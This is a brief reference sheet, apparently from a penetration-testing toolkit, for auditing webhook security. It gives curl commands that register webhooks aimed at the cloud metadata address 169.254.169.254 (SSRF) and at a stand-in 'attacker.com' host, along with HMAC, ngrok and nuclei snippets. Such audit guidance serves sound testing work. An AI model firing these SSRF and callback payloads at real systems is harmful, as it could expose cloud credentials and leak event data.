<!-- Copyright (c) 2026 defconxt. All rights reserved. -->
<!-- Licensed under AGPL-3.0 — see LICENSE file for details. -->
<!-- CIPHER is a trademark of defconxt. -->
# API Reference — Auditing Webhook Security

## curl — Webhook SSRF
```bash
# Register internal URL as webhook callback
curl -s -X POST URL/api/webhooks -H "Authorization: Bearer TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"url":"http://169.254.169.254/latest/meta-data/","events":["*"]}'

# Test HTTP (non-HTTPS) acceptance
curl -s -X POST URL/api/webhooks -H "Authorization: Bearer TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"url":"http://attacker.com/hook","events":["*"]}'
```

## HMAC Signature Verification
```python
import hmac, hashlib
secret = b'webhook_secret'
payload = b'{"event":"test"}'
sig = hmac.new(secret, payload, hashlib.sha256).hexdigest()
print(f'sha256={sig}')
```

## ngrok — Webhook Capture
```bash
ngrok http 8080  # Expose local listener
# Register ngrok URL as webhook destination
# Capture and analyze webhook payloads
```

## nuclei — Webhook Templates
```bash
nuclei -u URL -t http/vulnerabilities/ -tags ssrf,webhook
```
